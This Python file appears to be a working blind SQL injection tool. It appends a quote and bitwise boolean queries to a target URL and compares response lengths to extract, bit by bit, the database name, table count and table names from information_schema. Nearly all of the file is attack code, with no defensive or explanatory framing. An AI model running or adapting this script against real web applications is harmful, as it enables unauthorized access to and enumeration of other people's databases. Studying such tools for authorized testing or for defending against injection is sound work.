import requests
from requests.utils import requote_uri
import bitwise_public


class GetDbTableInformationClass:
    def __init__(self):
        self.SUCCESS_LENGTH = len(requests.get(bitwise_public.TARGET_URL).text)
        # Using DB name length
        self.db_name_length = 0
        # Using DB name
        self.db_name = ""
        # Tables number in DB
        self.tables_number = 0
        # List of tables name length in DB
        self.tables_name_length = []
        # List of tables name in DB
        self.tables_name = []

    # SQL Injection method
    def get_db_name_length(self):
        length_bin_list = []
        for shift_idx in range(7, -1, -1):
            res_length = len(requests.get(requote_uri(bitwise_public.TARGET_URL + '\'' +
                                                      bitwise_public.DATA_LENGTH_SHIFT_QUERY.format('db_name()',
                                                                                                    shift_idx) + ')'))
                             .text)
            length_bin_list.append(str(int(res_length == self.SUCCESS_LENGTH)))

        self.db_name_length = bitwise_public.parsing_bin_list_to_decimal(length_bin_list)
        print(self.db_name_length)

    def get_db_name(self):
        # one character list, not string
        db_name_char_list = []
        for db_name_idx in range(self.db_name_length):
            db_name_char_bin_list = []
            for shift_idx in range(7, -1, -1):
                res_length = len(requests.get(requote_uri(bitwise_public.TARGET_URL + '\'' +
                                                          bitwise_public.DATA_BIT_SHIFT_QUERY.format('db_name()',
                                                                                                     db_name_idx + 1,
                                                                                                     shift_idx,
                                                                                                     0))).text)
                db_name_char_bin_list.append(str(int(res_length == self.SUCCESS_LENGTH)))

            db_name_char_list.append(bitwise_public.parsing_bin_list_to_char(db_name_char_bin_list))

        self.db_name = ''.join(db_name_char_list)
        print(self.db_name)

    def get_tables_number(self):
        number_bin_list = []
        for shift_idx in range(7, -1, -1):
            # Need know DB name
            res_length = len(requests.get(requote_uri(bitwise_public.TARGET_URL + '\'' +
                                                      bitwise_public.DATA_COUNT_SHIFT_QUERY.format(
                                                          """select count(*) from information_schema.tables 
                                                          where table_schema = '{0}'""".format(self.db_name)
                                                          , shift_idx))).text)
            number_bin_list.append(str(int(res_length == self.SUCCESS_LENGTH)))

        self.tables_number = bitwise_public.parsing_bin_list_to_decimal(number_bin_list)
        print(self.tables_number)

    def get_tables_length(self):
        for table_idx in range(self.tables_number):
            tables_length_bin_list = []
            for shift_idx in range(7, -1, -1):
                res_length = len(requests.get(requote_uri(bitwise_public.TARGET_URL + '\'' +
                                                          bitwise_public.DATA_LENGTH_SHIFT_QUERY.format("""select TABLE_NAME
                                                          from information_schema.tables where table_schema = '{0}'
                                                          limit {1},1""".format(self.db_name, table_idx),
                                                                                                        shift_idx)))
                                 .text)
                tables_length_bin_list.append(str(int(res_length == self.SUCCESS_LENGTH)))

            self.tables_name_length.append(bitwise_public.parsing_bin_list_to_decimal(tables_length_bin_list))

        print(self.tables_name_length)

    def get_tables_name(self):
        for table_idx in range(self.tables_number):
            table_char_list = []
            for table_name_idx in range(self.tables_name_length[table_idx]):
                table_name_char_bin_list = []
                for shift_idx in range(7, -1, -1):
                    res_length = len(requests.get(requote_uri(bitwise_public.TARGET_URL + '\'' +
                                                              bitwise_public.DATA_BIT_SHIFT_QUERY.format("""select 
                                                              TABLE_NAME from information_schema.tables 
                                                              where table_schema = '{0}'
                                                              """.format(self.db_name),
                                                                                                         table_name_idx,
                                                                                                         shift_idx,
                                                                                                         table_idx)))
                                     .text)
                    table_name_char_bin_list.append(str(int(res_length == self.SUCCESS_LENGTH)))

                table_char_list.append(bitwise_public.parsing_bin_list_to_char(table_name_char_bin_list))

            self.tables_name.append(''.join(table_char_list))

    # Getter
    def db_name_getter(self):
        return self.db_name

    def tables_name_getter(self):
        return self.tables_name


if __name__ == '__main__':
    test_class = GetDbTableInformationClass()

    test_class.get_db_name_length()
    test_class.get_db_name()
    test_class.get_tables_number()
    test_class.get_tables_length()
    test_class.get_tables_name()

    print(test_class.db_name_getter())
    print(test_class.tables_name_getter())
